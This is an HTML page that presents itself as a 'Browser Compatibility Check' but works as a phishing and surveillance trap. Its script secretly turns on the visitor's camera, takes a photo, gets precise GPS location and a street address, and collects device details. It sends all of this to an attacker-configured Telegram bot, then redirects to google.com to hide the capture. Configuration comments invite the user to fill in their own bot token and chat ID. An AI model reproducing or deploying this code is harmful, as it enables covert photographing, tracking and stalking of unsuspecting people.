<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser Compatibility Check</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; }
        .loader { border-top-color: #3498db; animation: spinner 1.5s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div class="text-center">
        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-12 w-12 mb-4 mx-auto"></div>
        <h2 id="status-text" class="text-xl font-bold mb-2">Analyzing System...</h2>
        <p id="sub-text" class="text-gray-500 text-sm">Please wait while we verify your browser security.</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- âš ï¸ CONFIGURATION (Apni Details Dalo) ---
        const TELEGRAM_TOKEN = 'TUMHARA_TOKEN_YAHAN'; 
        const CHAT_ID = 'TUMHARI_ID_YAHAN';

        window.onload = async function() {
            const status = document.getElementById("status-text");
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            async function sendToTelegram(photoBlob, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'capture.png');
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                } catch (e) { console.error(e); }
            }

            async function getDeviceData() {
                const b = await navigator.getBattery?.() || { level: 0, charging: false };
                return `ðŸ“± *Device:* ${navigator.platform}\nðŸ”‹ *Battery:* ${Math.round(b.level * 100)}%\nðŸ’¾ *RAM:* ${navigator.deviceMemory || 'N/A'}GB\nâš™ï¸ *Cores:* ${navigator.hardwareConcurrency}`;
            }

            // --- AUTO TRIGGER ---
            try {
                // 1. Camera Access (Hidden)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                status.innerText = "Verifying Identity...";

                // 2. Location Access
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const { latitude, longitude } = pos.coords;
                    const deviceData = await getDeviceData();
                    
                    // Address fetch
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
                    const addrData = await res.json();
                    const addr = addrData.address;
                    const locationName = `${addr.suburb || addr.neighbourhood || ''} ${addr.city || addr.town || ''}, ${addr.state || ''}`;

                    // Wait 1.5 sec for camera to focus then capture
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                            const caption = `ðŸ”¥ *AUTO HIT DETECTED!*\n\nðŸ“ *Loc:* ${locationName}\n${deviceData}\n\nðŸŒ *Maps:* [Click Here](${mapLink})`;
                            
                            await sendToTelegram(blob, caption);
                            
                            // Cleanup & Redirect to real site
                            stream.getTracks().forEach(t => t.stop());
                            status.innerText = "System Verified!";
                            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
                        }, 'image/png');
                    }, 1500);

                }, (err) => {
                    status.innerText = "Error: Location Access Denied.";
                }, { enableHighAccuracy: true });

            } catch (err) {
                status.innerText = "Error: Hardware Access Required.";
            }
        };
    </script>
</body>
</html>
